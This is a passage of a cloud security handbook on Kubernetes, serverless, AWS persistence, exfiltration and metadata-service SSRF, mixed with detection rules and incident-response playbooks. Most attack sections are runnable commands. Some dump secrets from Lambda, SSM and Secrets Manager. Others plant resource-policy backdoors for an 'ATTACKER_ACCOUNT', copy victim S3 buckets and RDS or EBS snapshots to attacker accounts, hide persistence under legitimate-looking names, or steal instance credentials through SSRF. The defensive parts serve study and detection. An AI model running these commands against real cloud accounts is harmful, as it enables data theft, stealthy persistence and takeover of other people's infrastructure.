  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/default/my-secret | xxd | grep -A 5 password
```

### Kubernetes Detection: Audit Logs and Falco

**Kubernetes Audit Log Fields to Alert**

| Event | Suspicious Indicators |
|---|---|
| `create pods` | `spec.hostPID=true`, `spec.hostNetwork=true`, `privileged=true` |
| `create clusterrolebindings` | Binding to `cluster-admin` from non-admin SA |
| `exec` in pods | In `kube-system` namespace, or privileged pods |
| `get secrets` | Bulk retrieval, from unexpected service accounts |
| `create daemonsets` | Outside expected namespaces |

**Falco Rules for Container Escapes**

```yaml
# Falco: detect privileged container spawn
- rule: Launch Privileged Container
  desc: Detect launch of privileged container
  condition: >
    container.privileged=true and
    not user_privileged_containers and
    spawned_process
  output: >
    Privileged container started (user=%user.name container=%container.name
    image=%container.image.repository:%container.image.tag)
  priority: CRITICAL

# Falco: detect write to /etc on host from container
- rule: Write to Host /etc from Container
  desc: Detect write to /etc on host filesystem from within container
  condition: >
    open_write and
    container and
    fd.name startswith /etc and
    not user_known_write_etc_conditions
  output: >
    File write to /etc on host from container (user=%user.name
    file=%fd.name container=%container.name)
  priority: WARNING

# Falco: detect nsenter usage
- rule: Host Namespace Entered via nsenter
  desc: Detect nsenter which can escape container namespaces
  condition: >
    spawned_process and
    proc.name = nsenter and
    container
  output: >
    nsenter used in container (user=%user.name container=%container.name
    args=%proc.args)
  priority: CRITICAL
```

**kube-bench CIS Compliance**

```bash
# Run CIS Kubernetes benchmark
kube-bench run --targets master,node,etcd,policies

# Key checks:
# [FAIL] 1.2.6  Ensure that the --anonymous-auth argument is set to false
# [FAIL] 1.2.16 Ensure that the --authorization-mode is not set to AlwaysAllow
# [FAIL] 2.2    Ensure that etcd data is encrypted at rest
# [FAIL] 5.2.1  Minimize the admission of privileged containers
```

---

## 6. Serverless & PaaS Attacks

### Lambda Attack Surface

```bash
# Enumerate Lambda functions and configurations
aws lambda list-functions --query 'Functions[*].{Name:FunctionName,Role:Role,Runtime:Runtime}'
aws lambda get-function-configuration --function-name TARGET_FUNCTION

# Retrieve environment variables (may contain secrets)
aws lambda get-function-configuration --function-name TARGET_FUNCTION \
  --query 'Environment.Variables'

# Download and inspect function code
aws lambda get-function --function-name TARGET_FUNCTION --query 'Code.Location' --output text
# Returns presigned S3 URL — download and unzip for code review

# Overprivileged execution role exploitation
# Lambda running as role with broad permissions
aws sts get-caller-identity  # From within Lambda to confirm role
aws s3 ls  # Test what's accessible from Lambda execution role
aws secretsmanager list-secrets  # Enumerate secrets accessible to Lambda

# Event injection via S3 trigger
# Upload malicious object name to trigger Lambda with crafted event
aws s3 cp /dev/null s3://trigger-bucket/'{"key":"../../etc/passwd"}'

# Cold start timing side-channel (academic; confirms function existence/state)
# Repeated invocations: short latency = warm, long = cold start (function active)
```

### Cognito Misconfiguration

```bash
# Enumerate Cognito Identity Pools
aws cognito-identity list-identity-pools --max-results 60

# Test unauthenticated identity pool access
IDENTITY_ID=$(aws cognito-identity get-id \
  --identity-pool-id REGION:POOL_ID \
  --no-sign-request \
  --query IdentityId --output text)

# Get credentials for unauthenticated identity
aws cognito-identity get-credentials-for-identity \
  --identity-id $IDENTITY_ID \
  --no-sign-request

# If unauthenticated role has broad permissions, use returned credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls  # Test access

# Privilege escalation via Cognito user pool
# If user pool allows self-signup with admin attributes:
aws cognito-idp sign-up \
  --client-id USER_POOL_CLIENT_ID \
  --username attacker@evil.com \
  --password 'Passw0rd!' \
  --user-attributes Name=custom:role,Value=admin
```

### API Gateway Bypass

```bash
# Resource policy misconfiguration — check if API is publicly accessible
# without proper authorization
curl https://API_ID.execute-api.REGION.amazonaws.com/prod/admin

# Path traversal attempts on proxy integrations
curl "https://API_ID.execute-api.REGION.amazonaws.com/prod/..%2F..%2Fadmin"
curl "https://API_ID.execute-api.REGION.amazonaws.com/prod/%2e%2e%2fadmin"

# Stage variable injection (if Lambda receives stage variables as parameters)
# Craft requests manipulating stage variables passed to backend

# Usage plan key bypass
curl "https://API_ID.execute-api.REGION.amazonaws.com/prod/resource" \
  -H "x-api-key: KNOWN_VALID_KEY"

# WAF bypass via encoding
curl "https://API_ID.execute-api.REGION.amazonaws.com/prod/query?id=1'%20OR%201=1--"
```

### Secrets Manager and SSM Parameter Store Enumeration

```bash
# Enumerate and retrieve all secrets accessible to Lambda role
aws secretsmanager list-secrets --query 'SecretList[*].{Name:Name,ARN:ARN}'
aws secretsmanager get-secret-value --secret-id "prod/database/password"
aws secretsmanager get-secret-value --secret-id "prod/api/keys"

# SSM Parameter Store traversal
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
aws ssm get-parameter --name "/prod/rds/password" --with-decryption

# Batch retrieval
aws ssm get-parameters \
  --names /prod/db/host /prod/db/user /prod/db/pass \
  --with-decryption
```

### Serverless Detection

**Lambda CloudWatch Log Patterns**

```bash
# Query for unusual outbound connections in Lambda logs
aws logs filter-log-events \
  --log-group-name /aws/lambda/FUNCTION_NAME \
  --filter-pattern "?curl ?wget ?requests.get ?urllib ?socket" \
  --start-time $(date -d '1 hour ago' +%s000)

# Splunk query for Lambda environment variable access indicators
index=aws_cloudtrail eventName=GetFunctionConfiguration
| stats count by userIdentity.arn, requestParameters.functionName
| where count > 10

# Unusual invocation patterns (CloudWatch Metrics)
aws cloudwatch get-metric-statistics \
  --namespace AWS/Lambda \
  --metric-name Invocations \
  --dimensions Name=FunctionName,Value=FUNCTION_NAME \
  --statistics Sum \
  --period 300 \
  --start-time 2024-01-01T00:00:00 \
  --end-time 2024-01-02T00:00:00
```

**VPC Flow Log Analysis for Serverless**

```bash
# Detect Lambda data exfiltration via VPC Flow Logs
# Look for large outbound transfers to non-AWS IPs
aws logs filter-log-events \
  --log-group-name /aws/vpc/flowlogs/VPC_ID \
  --filter-pattern '[version, account, eni, source, destination, srcport, dstport, protocol, packets, bytes, start, end, action, status]
    bytes > 1000000 AND action = ACCEPT AND destination != "10.*"'
```

---

## 7. Cloud Lateral Movement & Persistence

### Cross-Account Role Assumption Chains

```bash
# Map cross-account trust relationships
# Account A -> assumes role in Account B -> assumes role in Account C (admin)
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument, `sts:AssumeRole`)].{Name:RoleName,ARN:Arn}'

# Execute role chain
# Step 1: Assume role in Account B
CREDS_B=$(aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_B:role/CrossAccountRole \
  --role-session-name pivot-session)
export AWS_ACCESS_KEY_ID=$(echo $CREDS_B | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_B | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS_B | jq -r '.Credentials.SessionToken')

# Step 2: From Account B, assume role in Account C
CREDS_C=$(aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_C:role/AdminRole \
  --role-session-name final-pivot)

# Each AssumeRole in CloudTrail shows originating ARN (not original identity)
# Making attribution difficult across chains
```

### Resource-Based Policy Backdoors

```bash
# S3 bucket policy backdoor — grant attacker external account access
aws s3api put-bucket-policy --bucket VICTIM_BUCKET --policy '{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
    "Action": ["s3:GetObject","s3:ListBucket","s3:PutObject"],
    "Resource": ["arn:aws:s3:::VICTIM_BUCKET","arn:aws:s3:::VICTIM_BUCKET/*"]
  }]
}'

# KMS key policy backdoor — allow attacker account to use encryption key
aws kms put-key-policy \
  --key-id KEY_ID \
  --policy-name default \
  --policy '{
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
      "Action": ["kms:Decrypt","kms:GenerateDataKey"],
      "Resource": "*"
    }]
  }'

# Lambda resource policy — allow attacker account to invoke Lambda
aws lambda add-permission \
  --function-name TARGET_FUNCTION \
  --statement-id backdoor \
  --action lambda:InvokeFunction \
  --principal ATTACKER_ACCOUNT_ID

# ECR repository policy — allow attacker to pull/push container images
aws ecr set-repository-policy \
  --repository-name TARGET_REPO \
  --policy-text '{
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
      "Action": ["ecr:GetDownloadUrlForLayer","ecr:BatchGetImage","ecr:PutImage"]
    }]
  }'

# Secrets Manager resource policy backdoor
aws secretsmanager put-resource-policy \
  --secret-id TARGET_SECRET \
  --resource-policy '{
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
      "Action": "secretsmanager:GetSecretValue",
      "Resource": "*"
    }]
  }'
```

### Organization-Level Persistence

```bash
# SCP modification — remove restrictions on attacker account
aws organizations update-policy \
  --policy-id POLICY_ID \
  --content '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# AWS Organizations delegated admin abuse
aws organizations register-delegated-administrator \
  --account-id ATTACKER_ACCOUNT \
  --service-principal securityhub.amazonaws.com

# CloudFormation StackSet abuse — deploy resources to all member accounts
aws cloudformation create-stack-set \
  --stack-set-name AWSConfig-ServiceRole \  # Benign-looking name
  --template-body file://backdoor-template.json \
  --permission-model SERVICE_MANAGED

aws cloudformation create-stack-instances \
  --stack-set-name AWSConfig-ServiceRole \
  --deployment-targets OrganizationalUnitIds=ROOT_OU \
  --regions us-east-1 us-west-2 eu-west-1
```

### EventBridge and CloudWatch Events Persistence

```bash
# Create EventBridge rule that triggers on any IAM change
aws events put-rule \
  --name IAMChangeMonitor \
  --event-pattern '{
    "source": ["aws.iam"],
    "detail-type": ["AWS API Call via CloudTrail"]
  }' \
  --state ENABLED

# Target a Lambda that maintains access (re-creates backdoor if cleaned)
aws events put-targets \
  --rule IAMChangeMonitor \
  --targets '[{
    "Id": "1",
    "Arn": "arn:aws:lambda:us-east-1:ATTACKER_ACCOUNT:function:maintain-access"
  }]'

# SSM Automation for persistence across EC2 instances
aws ssm create-association \
  --name AWSSupport-UpdateEC2Config \  # Mimics legitimate document
  --targets '[{"Key":"tag:Environment","Values":["Production"]}]' \
  --schedule-expression "rate(24 hours)"
```

### Persistence Indicators in CloudTrail

**CloudTrail Events to Correlate for Persistence Detection**

```kql
// Splunk query — detect IAM backdoor sequence
index=cloudtrail eventName IN (CreateUser, CreateLoginProfile, CreateAccessKey, 
  AttachUserPolicy, PutUserPolicy, AddUserToGroup, UpdateAssumeRolePolicy)
| stats count values(eventName) as events 
  values(requestParameters.userName) as users
  by sourceIPAddress, userIdentity.arn
| where count >= 2
| sort -count

// CloudTrail Lake query — unusual resource policy modifications
SELECT eventTime, eventName, userIdentity.arn, requestParameters, sourceIPAddress
FROM DATASTORE_ID
WHERE eventName IN ('PutBucketPolicy', 'PutKeyPolicy', 'AddPermission', 
                    'SetRepositoryPolicy', 'PutResourcePolicy')
  AND eventTime > DATEADD(HOUR, -24, NOW())
ORDER BY eventTime DESC
```

---

## 8. Data Exfiltration from Cloud

### S3 Data Exfiltration Techniques

```bash
# Technique 1: Direct sync to attacker-controlled bucket
aws s3 sync s3://victim-bucket/ s3://attacker-bucket/ \
  --source-region us-east-1 \
  --region us-west-2

# Technique 2: S3 Replication rule (persistent, ongoing exfiltration)
# Requires s3:PutReplicationConfiguration on victim bucket
aws s3api put-bucket-replication \
  --bucket victim-bucket \
  --replication-configuration '{
    "Role": "arn:aws:iam::VICTIM_ACCOUNT:role/ReplicationRole",
    "Rules": [{
      "Status": "Enabled",
      "Destination": {
        "Bucket": "arn:aws:s3:::attacker-bucket",
        "Account": "ATTACKER_ACCOUNT",
        "AccessControlTranslation": {"Owner": "Destination"}
      },
      "Filter": {"Prefix": ""}
    }]
  }'

# Technique 3: Presigned URL generation (exfil without AWS credentials)
# Generate presigned URL valid for 7 days
aws s3 presign s3://victim-bucket/sensitive-file.csv --expires-in 604800
# Share URL — anyone with it can download without authentication

# Technique 4: S3 Access Points to bypass bucket policies
aws s3control create-access-point \
  --account-id VICTIM_ACCOUNT \
  --name attacker-ap \
  --bucket victim-bucket
# Access point can have separate policy granting attacker access

# Technique 5: Cross-region copy via Lambda
# Deploy Lambda in attacker account that pulls from victim bucket cross-account
```

### RDS and Database Exfiltration

```bash
# Share RDS snapshot with external account
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier victim-snapshot-id \
  --attribute-name restore \
  --values-to-add ATTACKER_ACCOUNT_ID

# Copy shared snapshot to attacker account
aws rds copy-db-snapshot \
  --source-db-snapshot-identifier arn:aws:rds:us-east-1:VICTIM_ACCOUNT:snapshot:victim-snapshot \
  --target-db-snapshot-identifier attacker-copy \
  --region us-east-1

# Restore snapshot to attacker-controlled instance
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier attacker-db \
  --db-snapshot-identifier attacker-copy

# Aurora: share cluster snapshot
aws rds modify-db-cluster-snapshot-attribute \
  --db-cluster-snapshot-identifier victim-cluster-snap \
  --attribute-name restore \
  --values-to-add ATTACKER_ACCOUNT
```

### EBS and DynamoDB Exfiltration

```bash
# Share EBS snapshot with attacker account
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-XXXXXXXXXX \
  --attribute createVolumePermission \
  --operation-type add \
  --user-ids ATTACKER_ACCOUNT_ID

# In attacker account: copy snapshot then create volume
aws ec2 copy-snapshot \
  --source-region us-east-1 \
  --source-snapshot-id snap-XXXXXXXXXX \
  --description "backup"
# Mount to EC2 instance and read data

# DynamoDB export to attacker-controlled S3
aws dynamodb export-table-to-point-in-time \
  --table-arn arn:aws:dynamodb:us-east-1:VICTIM_ACCOUNT:table/Users \
  --s3-bucket attacker-bucket \
  --s3-prefix exfil/dynamo

# Redshift data share (Aurora/Redshift)
aws redshift create-endpoint-access \
  --cluster-identifier victim-cluster \
  --resource-owner ATTACKER_ACCOUNT \
  --endpoint-name attacker-endpoint
```

### DLP Controls and Detection

**Amazon Macie for S3 DLP**

```bash
# Enable Macie and configure sensitive data discovery
aws macie2 enable-macie
aws macie2 create-classification-job \
  --job-type ONE_TIME \
  --s3-job-definition '{
    "bucketDefinitions": [{
      "accountId": "ACCOUNT_ID",
      "buckets": ["sensitive-data-bucket"]
    }]
  }' \
  --name "Sensitive Data Discovery"

# Macie findings include: CREDENTIALS, FINANCIAL_INFORMATION, PERSONAL_INFORMATION
```

**GuardDuty Exfiltration Findings**

| Finding | Description |
|---|---|
| `Exfiltration:S3/AnomalousBehavior` | Anomalous S3 data transfer detected |
| `Exfiltration:S3/ObjectRead.Unusual` | Unusual number of S3 objects read |
| `Impact:S3/AnomalousBehavior` | Anomalous data mutation in S3 |
| `Policy:S3/BucketPublicAccessGranted` | Public access granted to bucket |
| `Stealth:S3/ServerAccessLoggingDisabled` | S3 server access logging disabled |
| `Impact:EC2/AbusedDomainRequest.Reputation` | DNS-based data exfiltration |

**VPC Flow Log Anomaly Detection**

```sql
-- CloudWatch Logs Insights: detect high-volume outbound transfers
fields @timestamp, srcAddr, dstAddr, bytes, action
| filter action = "ACCEPT" and bytes > 1000000
| filter not ispresent(dstAddr) or dstAddr != /^10\./
| stats sum(bytes) as totalBytes by srcAddr, dstAddr
| sort totalBytes desc
| limit 20

-- Splunk: detect data transfer to new external destinations
index=vpc_flowlogs action=ACCEPT
| where bytes > 100000
| eval external = if(match(dst_addr, "^10\.|^172\.1[6-9]\.|^192\.168\."), "internal", "external")
| where external = "external"
| stats sum(bytes) as totalBytes by dst_addr
| where NOT dst_addr IN (known_aws_service_ranges)
| sort -totalBytes
```

---

## 9. Cloud-Specific Exploitation

### SSRF to Cloud Metadata Services

**AWS IMDSv1 (Legacy, No Token Required)**

```bash
# Full IMDSv1 exploitation chain
# Step 1: Confirm SSRF to metadata
curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/"

# Step 2: Get available IAM role
curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 3: Get temporary credentials
curl "http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
# Returns JSON with AccessKeyId, SecretAccessKey, Token, Expiration

# Other useful metadata paths
# /latest/meta-data/instance-id
# /latest/meta-data/public-ipv4
# /latest/meta-data/public-hostname
# /latest/user-data (may contain secrets passed at launch)
# /latest/dynamic/instance-identity/document (account ID, region, instance type)

# IMDSv2 bypass attempt (fails with proper enforcement)
# IMDSv2 requires: PUT request first to get token, then GET with token header
# SSRF that only supports GET requests cannot get IMDSv2 token
# Enforce IMDSv2: aws ec2 modify-instance-metadata-options --http-tokens required
```

**GCP Metadata Service**

```bash
# GCP requires Metadata-Flavor: Google header (prevents basic SSRF)
curl "http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"

# Service account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"

# Project information
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"

# SSH public keys
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys" \
  -H "Metadata-Flavor: Google"

# SSRF bypass attempts: metadata.google.internal alternative
# metadata.google.internal resolves to 169.254.169.254 within GCP
# Some apps allow internal DNS names — try metadata.google.internal vs IP
```

**Azure IMDS**

```bash
# Azure IMDS requires Metadata: true header
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata:true"

# Get managed identity token
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata:true"

# Get specific managed identity token (multiple MIs assigned)
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/&client_id=CLIENT_ID" \
  -H "Metadata:true"
```

### Confused Deputy Attacks

Cross-service resource access where a service (the "deputy") acts on behalf of a principal with more permissions than intended:

```bash
# Classic confused deputy: CloudFormation execution role
# CF has iam:PassRole and broad permissions
# Attacker tricks CF into using admin role to create attacker resources

# S3 confused deputy: CloudTrail to S3 bucket policy
# CloudTrail writes to S3 — if bucket policy grants cloudtrail.amazonaws.com 
# without source account condition, attacker can write to victim bucket
# Mitigation: Use aws:SourceAccount condition in resource policies

# Lambda confused deputy: SNS to Lambda cross-account
# SNS in account A invokes Lambda in account B
# Lambda resource policy must include aws:SourceAccount condition

# Prevention pattern:
{
  "Condition": {
    "StringEquals": {
      "aws:SourceAccount": "VICTIM_ACCOUNT_ID"
    },
    "ArnLike": {
      "aws:SourceArn": "arn:aws:sns:us-east-1:VICTIM_ACCOUNT:TOPIC_NAME"
    }
  }
}
```

### Terraform State File Exposure

```bash
# terraform.tfstate contains plaintext credentials and resource details
# Common locations:
# - Local filesystem
# - S3 bucket (often without encryption or access controls)
# - Terraform Cloud
# - GitLab/GitHub CI artifacts

# Extract credentials from tfstate
python3 -c "
import json
with open('terraform.tfstate') as f:
    state = json.load(f)
    
# Search for sensitive values
def find_sensitive(obj, path=''):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if any(kw in k.lower() for kw in ['password', 'secret', 'key', 'token', 'credential']):
                print(f'{path}.{k}: {v}')
            find_sensitive(v, f'{path}.{k}')
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            find_sensitive(v, f'{path}[{i}]')

find_sensitive(state)
"

# Pulumi state backend attacks — similar issue
# pulumi stack export --show-secrets
# Exports all stack state including secret values

# Cloud credentials in Docker image layers
# Extract all layers of a Docker image
docker save TARGET_IMAGE | tar xv
# Search layer tarballs for credential files
find . -name "*.json" -exec grep -l "private_key\|access_key\|secret_key" {} \;
```

### JWT Manipulation for Cloud APIs

```bash
# Decode and inspect cloud JWT tokens
echo "JWT_TOKEN" | python3 -c "
import sys, base64, json
token = sys.stdin.read().strip()
parts = token.split('.')
header = json.loads(base64.b64decode(parts[0] + '=='))
payload = json.loads(base64.b64decode(parts[1] + '=='))
print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
"

# Azure AD token claims analysis
# aud (audience), oid (object ID), roles, scp (scopes), tid (tenant)

# GCP service account token — short-lived (1 hour), signed by Google
# Cannot be modified but can be replayed if stolen before expiry

# OAuth token scope escalation
# If app requests offline_access, attacker can use refresh token indefinitely
# Mitigation: continuous access evaluation (CAE) in Azure AD
```

### Cloud-Native SQL Injection Paths

```bash
# AWS Athena SQL injection via Lambda event
# If Lambda constructs Athena query from user input:
# SELECT * FROM logs WHERE user = 'INPUT'
# Injection: ' UNION SELECT access_key, secret_key FROM iam_credentials --

# RDS via overprivileged Lambda connection
# If Lambda has direct RDS access with admin credentials
# Standard SQL injection applies to the underlying database

# AWS Glue data catalog — similar injection surface
# If Glue ETL job constructs queries from parameters

# Redshift Spectrum — query S3 data lakes
# Injection in external table definitions
```

---

## 10. Cloud Security Posture & Detection

### Cloud Security Posture Management (CSPM)

**AWS Security Hub**

```bash
# Enable Security Hub with all standards
aws securityhub enable-security-hub --enable-default-standards

# Enable specific standards
aws securityhub batch-enable-standards --standards-subscription-requests \
  '[{"StandardsArn":"arn:aws:securityhub:us-east-1::standards/cis-aws-foundations-benchmark/v/1.4.0"}]' \
  '[{"StandardsArn":"arn:aws:securityhub:us-east-1::standards/aws-foundational-security-best-practices/v/1.0.0"}]'

# Query high-severity findings
aws securityhub get-findings \
  --filters '{
    "SeverityLabel": [{"Value": "CRITICAL","Comparison": "EQUALS"},{"Value": "HIGH","Comparison": "EQUALS"}],
    "RecordState": [{"Value": "ACTIVE","Comparison": "EQUALS"}],
    "WorkflowStatus": [{"Value": "NEW","Comparison": "EQUALS"}]
  }' \
  --query 'Findings[*].{Title:Title,Severity:Severity.Label,Resource:Resources[0].Id}'

# CIS AWS Benchmark key controls:
# 1.1  Avoid the use of root account
# 1.4  Ensure access keys are rotated every 90 days
# 1.5  Ensure IAM password policy requires uppercase letters
# 2.1  Ensure CloudTrail is enabled in all regions
# 2.2  Ensure CloudTrail log file validation is enabled
# 3.1  Ensure unauthorized API calls are monitored
# 4.1  Ensure no security groups allow ingress from 0.0.0.0/0 to port 22
```

**Third-Party CSPM Tools**

| Tool | Strengths | Coverage |
|---|---|---|
| Wiz | Graph-based attack path analysis, runtime context | AWS, Azure, GCP, OCI, K8s |
| Orca Cloud | Agentless SideScanning, data classification | AWS, Azure, GCP, OCI |
| Prisma Cloud (Palo Alto) | CNAPP, full lifecycle, code to cloud | All major clouds |
| Lacework | Behavioral anomaly detection, ML-based | AWS, Azure, GCP, K8s |
| Orca Security | Vulnerability prioritization, SBOM | AWS, Azure, GCP |
| Prowler | Open-source, CIS benchmarks, CLI | AWS, Azure, GCP |

```bash
# Prowler open-source CSPM
pip install prowler
prowler aws --compliance cis_1.5_aws
prowler azure --compliance cis_2.0_azure
prowler gcp --compliance cis_2.0_gcp

# Specific checks
prowler aws -c iam_no_root_access_key iam_password_policy_uppercase \
  s3_bucket_no_public_access cloudtrail_multi_region_enabled
```

### AWS GuardDuty — Threat Detection

```bash
# Enable GuardDuty with S3, EKS, Malware protection
aws guardduty create-detector \
  --enable \
  --data-sources '{
    "S3Logs":{"Enable":true},
    "Kubernetes":{"AuditLogs":{"Enable":true}},
    "MalwareProtection":{"ScanEc2InstanceWithFindings":{"EbsVolumes":true}}
  }'

# List active findings sorted by severity
aws guardduty list-findings \
  --detector-id DETECTOR_ID \
  --finding-criteria '{
    "Criterion":{
      "severity":{"Gte":7},
      "service.archived":{"Eq":["false"]}
    }
  }'

# Get finding details
aws guardduty get-findings \
  --detector-id DETECTOR_ID \
  --finding-ids FINDING_ID

# GuardDuty ML models detect:
# - Unusual API call patterns (time, volume, type)
# - Calls from known malicious IPs/domains
# - Anomalous geographic locations
# - Cryptocurrency mining indicators
# - Port scanning from EC2 instances
# - Exfiltration patterns (DNS tunneling, high-volume S3 access)
```

### CloudTrail Lake for Threat Hunting

```sql
-- CloudTrail Lake: Find all AssumeRole calls from external accounts
SELECT eventTime, userIdentity.arn, userIdentity.accountId,
       requestParameters.roleArn, sourceIPAddress
FROM DATASTORE_ID
WHERE eventName = 'AssumeRole'
  AND userIdentity.accountId != '123456789012'  -- Replace with your account
  AND eventTime > DATEADD(DAY, -7, NOW())
ORDER BY eventTime DESC

-- CloudTrail Lake: Detect IAM backdoor creation sequence
SELECT eventTime, userIdentity.arn, eventName, requestParameters
FROM DATASTORE_ID
WHERE eventName IN ('CreateUser', 'CreateLoginProfile', 'CreateAccessKey',
                    'AttachUserPolicy', 'PutUserPolicy')
  AND eventTime > DATEADD(HOUR, -24, NOW())
ORDER BY eventTime

-- CloudTrail Lake: Find disabled security services
SELECT eventTime, userIdentity.arn, eventName, sourceIPAddress
FROM DATASTORE_ID
WHERE eventName IN ('StopLogging', 'DeleteTrail', 'DeleteDetector',
                    'DisableSecurityHub', 'DisableConfig')
ORDER BY eventTime DESC

-- CloudTrail Lake: Detect large-scale S3 enumeration
SELECT userIdentity.arn, sourceIPAddress, COUNT(*) as callCount
FROM DATASTORE_ID
WHERE eventName IN ('ListBuckets', 'GetBucketAcl', 'GetBucketPolicy', 'HeadObject')
  AND eventTime > DATEADD(HOUR, -1, NOW())
GROUP BY userIdentity.arn, sourceIPAddress
HAVING COUNT(*) > 100
ORDER BY callCount DESC

-- CloudTrail Lake: Cross-region activity from single identity
SELECT userIdentity.arn, awsRegion, COUNT(*) as actions
FROM DATASTORE_ID
WHERE eventTime > DATEADD(HOUR, -6, NOW())
GROUP BY userIdentity.arn, awsRegion
HAVING COUNT(DISTINCT awsRegion) > 5
```

### Cloud Incident Response Playbooks

**Phase 1: Isolate Compromised IAM Identity**

```bash
# STEP 1: Attach explicit deny policy to compromised user/role
aws iam put-user-policy \
  --user-name COMPROMISED_USER \
  --policy-name INCIDENT-QUARANTINE \
  --policy-document '{
    "Statement":[{
      "Effect":"Deny",
      "Action":"*",
      "Resource":"*"
    }]
  }'

# For compromised role: modify trust policy to deny all assumptions
aws iam update-assume-role-policy \
  --role-name COMPROMISED_ROLE \
  --policy-document '{"Statement":[{"Effect":"Deny","Principal":"*","Action":"sts:AssumeRole"}]}'

# STEP 2: Revoke all active sessions (invalidate existing tokens)
aws iam attach-user-policy \
  --user-name COMPROMISED_USER \
  --policy-arn arn:aws:iam::aws:policy/AWSDenyAll

# Revoke STS sessions by setting session revocation policy on role
aws iam put-role-policy \
  --role-name COMPROMISED_ROLE \
  --policy-name RevokeOldSessions \
  --policy-document "{
    \"Statement\":[{
      \"Effect\":\"Deny\",
      \"Action\":\"*\",
      \"Resource\":\"*\",
      \"Condition\":{
        \"DateLessThan\":{
          \"aws:TokenIssueTime\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"
        }
      }
    }]
  }"

# STEP 3: Delete access keys
aws iam delete-access-key \
  --user-name COMPROMISED_USER \
  --access-key-id AKID_TO_REVOKE

# STEP 4: Rotate credentials
aws iam create-access-key --user-name REPLACEMENT_USER
```

**Phase 2: Preserve Evidence**

```bash
# Preserve CloudTrail logs — copy to isolated forensics account S3
aws s3 sync s3://cloudtrail-logs-bucket/ s3://forensics-bucket/incident-2024-01-01/ \
  --source-region us-east-1 \
  --sse aws:kms \
  --sse-kms-key-id FORENSICS_KMS_KEY

# Create EBS snapshots of affected instances for forensic analysis
aws ec2 create-snapshot \
  --volume-id AFFECTED_VOLUME \
  --description "INCIDENT-2024-01-01 forensic copy"

# Share snapshot with isolated forensics account
aws ec2 modify-snapshot-attribute \
  --snapshot-id SNAPSHOT_ID \
  --attribute createVolumePermission \
  --operation-type add \
  --user-ids FORENSICS_ACCOUNT_ID

# Enable enhanced memory acquisition via SSM
aws ssm send-command \
  --instance-ids INSTANCE_ID \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["avml /tmp/memory.lime && aws s3 cp /tmp/memory.lime s3://forensics-bucket/memory/"]'

# Enable VPC Flow Logs if not already enabled
aws ec2 create-flow-logs \
  --resource-type VPC \
  --resource-ids VPC_ID \
  --traffic-type ALL \
  --log-destination-type s3 \
  --log-destination arn:aws:s3:::forensics-flow-logs
```

**Phase 3: Scope and Contain**

```bash
# Identify all resources created/modified by compromised identity
# CloudTrail Lake query:
aws cloudtrail start-query \
  --query-statement "
    SELECT eventTime, eventName, requestParameters, responseElements
    FROM DATASTORE_ID
    WHERE userIdentity.arn LIKE '%COMPROMISED_USER%'
      AND eventTime > DATEADD(DAY, -30, NOW())
    ORDER BY eventTime
  "

# Network isolation: modify security group to deny all traffic
aws ec2 revoke-security-group-ingress \
  --group-id INSTANCE_SG \
  --protocol all \
  --port all \
  --cidr 0.0.0.0/0

aws ec2 create-security-group \
  --group-name QUARANTINE-SG \
  --description "Quarantine - no ingress/egress" \
  --vpc-id VPC_ID

aws ec2 modify-instance-attribute \
  --instance-id INSTANCE_ID \
  --groups QUARANTINE_SG_ID
```

### Microsoft Defender for Cloud — Azure Detection

```kql
// Sentinel: Detect Azure token replay across different IPs
SigninLogs
| where ResultType == 0
| summarize IPList = make_set(IPAddress), Locations = make_set(Location)
  by UserPrincipalName, CorrelationId
| where array_length(IPList) > 2
| project UserPrincipalName, IPList, Locations

// Sentinel: Privileged role assignment to non-admin
AuditLogs
| where OperationName in (
    "Add member to role",
    "Add eligible member to role")
| where Result == "success"
| extend TargetRole = tostring(TargetResources[0].displayName)
| extend AssignedTo = tostring(TargetResources[1].userPrincipalName)
| extend AssignedBy = tostring(InitiatedBy.user.userPrincipalName)
